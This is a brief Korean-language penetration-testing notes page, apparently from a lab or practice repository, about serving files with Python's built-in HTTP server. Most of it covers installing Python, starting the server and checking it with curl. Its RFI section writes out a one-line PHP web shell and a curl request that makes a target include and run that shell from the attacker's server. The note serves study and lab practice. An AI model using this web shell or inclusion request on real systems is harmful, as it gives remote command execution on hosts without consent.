# python server

## 개요

`python3 -m http.server`로 로컬 파일 서버를 띄워, 공격자가 파일을 내려받게 하는 실습이 자주 나온다. 또한 "원격 스크립트를 실행"하는 RFI 시연에도 사용한다.

## 실행

```bash
sudo apt update
sudo apt install python3 -y

# 현재 폴더의 모든 파일을 내려받을 수 있는 서버
python3 -m http.server 8000
```

- 포트는 8000을 쓰지만, 다른 포트로 바꿔도 된다.
- 실행 위치가 서버의 루트가 된다. `cd`해서 폴더를 바꾸면 그 폴더를 서비스한다.

## 확인

```bash
# 서버에 접근 (공격자 PC 또는 타깃)
curl http://127.0.0.1:8000/
```

## RFI 시연에 쓰는 경우

```bash
# 원격에서 실행할 스크립트를 호스트에 두고
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# 대상에 요청
curl "http://target/upload/?file=http://127.0.0.1:8000/shell.php"
```

- 이 시연은 [php_pipe](../../shells/reverse-shell/php_pipe.md) 문서를 참고한다.

## 참고 / 증적
- 발견한 내용과 증거는 노트(05-progress-tracker.md)에 함께 기록한다.
